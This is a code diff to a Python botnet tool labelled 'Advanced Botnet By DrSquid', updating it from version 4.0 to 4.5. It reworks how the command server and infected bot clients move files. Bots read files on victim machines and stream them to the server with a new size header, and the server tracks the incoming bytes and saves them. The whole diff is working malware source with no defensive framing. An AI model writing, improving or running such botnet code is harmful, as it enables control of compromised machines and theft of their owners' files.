@@ -34,12 +34,12 @@ class BotNet:
                                || || ||
                                || || ||
                                || || ||
-  _________            .__    .||_||_||__          __  ________           _____    _______   
- /   _____/ ________ __|__| __|||/\      \   _____/  |_\_____  \  ___  __/  |  |   \   _  \  
- \_____  \ / ____/  |  \  |/ __ | /   |   \_/ __ \   __\/  ____/  \  \/ /   |  |_  /  /_\  \ 
- /        < <_|  |  |  /  / /_/ |/    |    \  ___/|  | /       \   \   /    ^   /  \  \_/   \\
-/_______  /\__   |____/|__\____ |\____|__  /\___  >__| \_______ \   \_/\____   | /\ \_____  /
-        \/    |__|             \/ || ||  \/     \/             \/           |__| \/       \/ 
+  _________            .__    .||_||_||__          __  ________           _____      .________
+ /   _____/ ________ __|__| __|||/\      \   _____/  |_\_____  \  ___  __/  |  |     |   ____/
+ \_____  \ / ____/  |  \  |/ __ | /   |   \_/ __ \   __\/  ____/  \  \/ /   |  |_    |____  \ 
+ /        < <_|  |  |  /  / /_/ |/    |    \  ___/|  | /       \   \   /    ^   /    /       \\
+/_______  /\__   |____/|__\____ |\____|__  /\___  >__| \_______ \   \_/\____   | /\ /______  /
+        \/    |__|             \/ || ||  \/     \/             \/           |__| \/        \/ 
                                || || ||
                                || || ||
                                || || ||
@@ -394,18 +394,28 @@ Advanced Botnet By DrSquid
         which in this case it will be the server admin due to the function only being used in the transferring of files
          from the server to the server admin."""
         self.sending_file = True
-        file = open(filename, "rb")
+        transferred = True
+        try:
+            file = open(os.path.join(os.getcwd(),os.path.join(self.ftp_dir,filename)), "rb")
+            length = len(open(file.name,"rb").read())
+        except Exception as e:
+            transferred = False
+            length = 0
+        conn.send(f"!filesize {length}".encode())
         time.sleep(2)
         while True:
-            sendto = file.read(10240)
-            if not sendto:
-                time.sleep(2)
-                conn.send("!stopsave".encode())
+            try:
+                sendto = file.read(10240)
+                if not sendto:
+                    break
+                else:
+                    conn.send(sendto)
+            except Exception as e:
+                print(e)
                 break
-            else:
-                conn.send(sendto)
-        time.sleep(5)
-        self.send_to_other("SERVER",self.admin_username,"File Transfer completed.", conn)
+        if transferred:
+            time.sleep(1)
+            self.send_to_other("SERVER",self.admin_username,"File Transfer completed.", conn)
     def handle(self, conn, ip):
         """Very important function, needed for handling the connections of the clients. The way a bot is recognized 
         is quite simple really. There are many variables that help with the process. The handler first uses the information 
@@ -425,6 +435,8 @@ Advanced Botnet By DrSquid
         name = ip
         admin = False
         registered = False
+        filesize = 0
+        bytesrecv = 0
         while True:
             try:
                 display_single_msg = True
@@ -501,16 +513,16 @@ Advanced Botnet By DrSquid
                                                 self.send_to_other(name, self.admin_username,msg, self.adminconn)
                                             else:
                                                 try:
-                                                    if msg == "!stopsave":
-                                                        self.downloading = False
-                                                        self.botdownload.close()
-                                                    elif msg == "!fileerror":
-                                                        self.downloading = False
-                                                        self.botdownload.close()
-                                                        os.remove(self.botdownload.name)
-                                                        self.send_to_other("SERVER",self.admin_username,"There was an error with downloading the bot's file. Cancelling the download.")
+                                                    if msg.startswith("!filesize"):
+                                                        filesize = int(msg.split()[1])
                                                     else:
+                                                        bytesrecv += len(msg_from_bot)
                                                         self.botdownload.write(msg_from_bot)
+                                                        if bytesrecv >= filesize:
+                                                            bytesrecv = 0
+                                                            filesize = 0
+                                                            self.downloading = False
+                                                            self.botdownload.close()
                                                 except Exception as e:
                                                     self.botdownload.write(msg_from_bot)
                                 except:
@@ -731,10 +743,13 @@ Advanced Botnet By DrSquid
                                 elif msg.startswith("!download"):
                                     try:
                                         filename = self.get_filename(msg)
-                                        file = open(os.path.join(os.getcwd(),f"{self.ftp_dir}/{filename}"),"rb")
-                                        file.close()
+                                        try:
+                                            file = open(os.path.join(os.getcwd(),f"{self.ftp_dir}/{filename}"),"rb")
+                                            file.close()
+                                        except:
+                                            pass
                                         self.send_to_other("SERVER",name, f"Preparing to download file: {file.name}.", conn)
-                                        self.send_file(file.name, conn)
+                                        self.send_file(filename, conn)
                                     except FileNotFoundError:
                                         self.send_to_other("SERVER",name,f"The file specified does not exist!", conn)
                                     except Exception as e:
@@ -4509,12 +4524,12 @@ class Bot:
                     try:
                         file = self.get_filename(msg)
                         file = open(file, "rb")
+                        length = len(open(file.name,"rb").read())
+                        self.client.send(f"!filesize {length}".encode())
                         self.sendingfile = True
                         while True:
                             sendto = file.read(10240)
                             if not sendto:
-                                time.sleep(3)
-                                self.client.send("!stopsave".encode())
                                 self.sendingfile = False
                                 break
                             else:
@@ -4522,9 +4537,10 @@ class Bot:
                         time.sleep(1)
                         self.client.send("File transfer to server completed.".encode())
                     except:
+                        length = 0
+                        self.client.send(f"!filesize {length}".encode())
+                        time.sleep(1)
                         self.client.send("File was not found in the bot directory.".encode())
-                        time.sleep(3)
-                        self.client.send("!stopsave".encode())
                 elif msg.startswith("!download"):
                     try:
                         link = msg.split()[1]
@@ -4566,7 +4582,7 @@ bot.initiate_connection()
         return payload
 class AutoUpdate:
     def __init__(self):
-        self.version = 4.0
+        self.version = 4.5
     def check_update(self):
         print(BotNet.logo(None))
         print("[+] Checking for updates.....")
